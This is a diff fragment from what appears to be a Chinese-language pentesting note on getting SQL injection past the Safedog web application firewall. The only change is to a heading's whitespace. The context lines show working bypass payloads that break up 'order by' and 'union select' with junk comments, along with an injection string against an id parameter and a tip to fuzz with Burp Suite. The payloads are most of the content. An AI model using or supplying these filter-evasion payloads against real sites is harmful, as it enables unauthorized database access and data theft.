@@ -8,7 +8,7 @@
 order by一起出现会引发安全狗警告，要在order by之间添加一些字符\
 order /*//%$*/ by 1 -- 1
 
-### 安全狗select　union的绕过（防止联合查询）
+### 安全狗select union的绕过（防止联合查询）
 select和union在一起的时候会触发\
 跟order by原理相同，不过需要我们用bp进行fuzz\
 ?id=-2' union /*/$%^*/ select 1,2,3 -- 1
